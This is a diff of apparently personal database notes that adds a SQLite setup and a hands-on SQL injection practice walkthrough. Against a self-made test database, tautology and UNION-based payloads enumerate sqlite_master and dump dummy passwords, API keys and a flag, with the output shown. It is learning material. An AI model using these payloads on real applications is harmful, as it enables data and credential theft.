@@ -173,55 +173,74 @@ move 'AdventureworksDW2017_log' to '/var/opt/mssql/data/AdventureworksDW2017.ldf
 ```
 	
 ## Sqlite CRUD
+Create a test.db and connect to it, by default is completely empty, 0 bytes
+```bash
+sqlite3 test.db
+```
+
+Observe that the sqlite master is empty at that stage
 ```sql
-.databases                    # display attached databases
-.tables                       # display tables 
-.schema users                 # show the schema of table users
+SELECT * FROM sqlite_master;
+```
+
+Create a schema with 2 tables
+```sql
+CREATE TABLE users (
+   id INTEGER PRIMARY KEY,
+   username TEXT,
+   passowrd TEXT,
+   role TEXT,
+   email TEXT
+);
+```
+
+```sql
+CREATE TABLE sensitive_data (
+   id INTEGER PRIMARY KEY,
+   data_type TEXT,
+   content TEXT
+);
+```
+
+insert dummy data in the tables
+```sql
+INSERT INTO users (username, password, role, email) VALUES
+   ('admin', 'admin123', 'administrator', 'admin@company.com'),
+   ('guest', 'guest', 'guest', 'guest@company.com'),
+   ('user1', 'password1', 'user', 'user1@company.com');
+```
+
+```sql
+INSERT INTO sensitive_data (id, data_type, content) VALUES
+   (1, 'credentials', 'Database admin password: db_admin_2024!'),
+   (2, 'api_keys', 'API_KEY=sk-1234567890abcdef, SECRET=xyz789'),
+   (3, 'flag', 'FLAG{fastmcp_sql_injection_pwned}');
+```
+
+Now the `sqlite_master` has our tables
+```sql
+SELECT * FROM sqlite_master;
+SELECT name FROM sqlite_master WHERE type='table';
+```
+
+Dot commands are sqlite3 cli specific features, only exist in the interractive shell
+```sql
 .mode table                   # display as tables 
 .headers on                   # display the column headers 
-pragma table_info(user);
-select * from key_names;
+.databases                    # display attached databases
+.tables                       # display tables 
+.schema                       # show the whole schema
+.schema users                 # show the schema of table users
+.separator "\t"               # use tabs as column separator (.mode table probably better)
 ```
 
-create and attach test.db
+PRAGMA, SELECT, CREATE, etc, are SQL statements, they're part of the SQLite engine itself.
 ```sql
-sqlite3 test.db 
+PRAGMA table_info(users);      # show column-level details for a specific table
+SELECT * FROM users;
 ```
 
-attach an existing db
-```sql
-ATTACH DATABASE 'testDB.db' as 'TEST';
-```
-
-create a table schema
-```sql
-CREATE TABLE users(
-   id INT PRIMARY KEY     NOT NULL,
-   username       TEXT    NOT NULL,
-   hash           TEXT    NOT NULL,
-   salt           TEXT    NOT NULL
-);
-```
-
-```
-CREATE TABLE pies(
-   ip           TEXT    NOT NULL,
-   banner       TEXT,
-   auth         TEXT,
-   UNIQUE(ip)
-);
-```
-
-```
-INSERT INTO raspbian VALUES('asdf','asdf');
-```
-
-insert items in the table 
-```sql
-INSERT INTO users (id, username, hash, salt)
-VALUES (1, 'Paul', '5f4dcc3b5aa765d61d8327deb882cf99', 'salty');
-```
-
+add a row in a table
 ```sql
 ALTER TABLE table_name
   ADD new_column_name column_definition;
@@ -234,9 +253,146 @@ DELETE FROM raspbian WHERE banner like '%Raspbian%';
 delete from raspbian where banner not like '%Raspbian%';
 ```
 
-delete table
+drop a table
 ```sql
 DROP TABLE table_name 
+```
+
+SQLi union practice
+
+assuming we have injection here in the value of the username column of the users table
+```sql
+select username,role,email from users where username == '';
+select username,role,email from users where username == 'admin';
+select Username,role,email from users where username == 'admin' or 1=1 --';
+```
+
+We want to use union to join some of the `sqlite_master` data with the
+3 columns we have from users.
+```sql
+select username,role,email from users;
+select type,name,sql from sqlite_master;
+```
+```
++----------+---------------+-------------------+
+| username |     role      |       email       |
++----------+---------------+-------------------+
+| admin    | administrator | admin@company.com |
+| guest    | guest         | guest@company.com |
+| user1    | user          | user1@company.com |
++----------+---------------+-------------------+
+```
+```
++-------+----------------+-------------------------------+
+| type  |      name      |              sql              |
++-------+----------------+-------------------------------+
+| table | users          | CREATE TABLE users (          |
+|       |                |    id INTEGER PRIMARY KEY,    |
+|       |                |    username TEXT,             |
+|       |                |    password TEXT,             |
+|       |                |    role TEXT,                 |
+|       |                |    email TEXT                 |
+|       |                | )                             |
++-------+----------------+-------------------------------+
+| table | sensitive_data | CREATE TABLE sensitive_data ( |
+|       |                |    id INTEGER PRIMARY KEY,    |
+|       |                |    data_type TEXT,            |
+|       |                |    content TEXT               |
+|       |                | )                             |
++-------+----------------+-------------------------------+
+```
+
+Confirm we have 3 columns with NULL, NULL, NULL, but we know we do.
+Then try to do a UNION of type,name,sql from `sqlite_master` into users
+```sql
+select username,role,email from users where username == 'admin' or 1=1 UNION SELECT NULL,NULL,NULL --';
+select username,role,email from users where username == 'admin' or 1=1 UNION SELECT type,name,sql FROM sqlite_master --';
+```
+```
++----------+----------------+-------------------------------+
+| username |      role      |             email             |
++----------+----------------+-------------------------------+
+| admin    | administrator  | admin@company.com             |
++----------+----------------+-------------------------------+
+| guest    | guest          | guest@company.com             |
++----------+----------------+-------------------------------+
+| table    | sensitive_data | CREATE TABLE sensitive_data ( |
+|          |                |    id INTEGER PRIMARY KEY,    |
+|          |                |    data_type TEXT,            |
+|          |                |    content TEXT               |
+|          |                | )                             |
++----------+----------------+-------------------------------+
+| table    | users          | CREATE TABLE users (          |
+|          |                |    id INTEGER PRIMARY KEY,    |
+|          |                |    username TEXT,             |
+|          |                |    password TEXT,             |
+|          |                |    role TEXT,                 |
+|          |                |    email TEXT                 |
+|          |                | )                             |
++----------+----------------+-------------------------------+
+| user1    | user           | user1@company.com             |
++----------+----------------+-------------------------------+
+```
+
+Great at this point we know a lot, we know exactly what the tables are,
+but also their schemas, which means we know the name of each of their respective columns.
+So we can use UNION again to get everything from the sensitive data table.
+```sql
+select username,role,email from users where username == 'admin' or 1=1 UNION SELECT * FROM sensitive_data --';
+select username,role,email from users where username == 'admin' or 1=1 UNION SELECT id,data_type,content FROM sensitive_data --';
+```
+```
++----------+---------------+--------------------------------------------+
+| username |     role      |                   email                    |
++----------+---------------+--------------------------------------------+
+| 1        | credentials   | Database admin password: db_admin_2024!    |
+| 2        | api_keys      | API_KEY=sk-1234567890abcdef, SECRET=xyz789 |
+| 3        | flag          | FLAG{fastmcp_sql_injection_pwned}          |
+| admin    | administrator | admin@company.com                          |
+| guest    | guest         | guest@company.com                          |
+| user1    | user          | user1@company.com                          |
++----------+---------------+--------------------------------------------+
+```
+
+We could've used group concat too
+```sql
+select username,role,email from users where username == 'admin' or 1=1 UNION SELECT NULL, NULL, GROUP_CONCAT(name) FROM sqlite_master --';
+select username,role,email from users where username == 'admin' or 1=1 UNION SELECT NULL, NULL, GROUP_CONCAT(content) FROM sensitive_data --';
+select username,role,email from users where username == 'admin' or 1=1 UNION SELECT NULL, NULL, GROUP_CONCAT(password) FROM users --';
+```
+```
++----------+---------------+----------------------+
+| username |     role      |        email         |
++----------+---------------+----------------------+
+|          |               | users,sensitive_data |
+| admin    | administrator | admin@company.com    |
+| guest    | guest         | guest@company.com    |
+| user1    | user          | user1@company.com    |
++----------+---------------+----------------------+
+```
+```
++----------+---------------+--------------------------------------------------------------+
+| username |     role      |                            email                             |
++----------+---------------+--------------------------------------------------------------+
+|          |               | Database admin password: db_admin_2024!,API_KEY=sk-123456789 |
+|          |               | 0abcdef, SECRET=xyz789,FLAG{fastmcp_sql_injection_pwned}     |
++----------+---------------+--------------------------------------------------------------+
+| admin    | administrator | admin@company.com                                            |
++----------+---------------+--------------------------------------------------------------+
+| guest    | guest         | guest@company.com                                            |
++----------+---------------+--------------------------------------------------------------+
+| user1    | user          | user1@company.com                                            |
++----------+---------------+--------------------------------------------------------------+
+```
+```
++----------+---------------+--------------------------+
+| username |     role      |          email           |
++----------+---------------+--------------------------+
+|          |               | admin123,guest,password1 |
+| admin    | administrator | admin@company.com        |
+| guest    | guest         | guest@company.com        |
+| user1    | user          | user1@company.com        |
++----------+---------------+--------------------------+
 ```
 
 ## Redis CRUD
